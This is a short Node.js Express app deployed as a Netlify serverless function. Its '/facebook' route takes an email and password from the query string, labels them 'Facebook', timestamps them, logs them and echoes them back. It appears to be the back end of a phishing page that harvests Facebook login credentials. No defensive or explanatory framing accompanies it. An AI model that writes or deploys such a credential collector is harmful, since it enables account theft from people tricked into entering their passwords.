const express = require("express");
const serverless = require("serverless-http");

const app = express();
const router = express.Router();

router.get("/", (req, res) => {
  res.send("Hello world");
});

router.get("/facebook", (req, res) => {
  let data = `Facebook Date: ${new Date().toLocaleString()} Email: ${
    req.query.email
  } Password: ${req.query.password}\n`;
  console.log(data);
  res.send(req.query);
});

app.use("/.netlify/functions/api", router);

module.exports.handler = serverless(app);
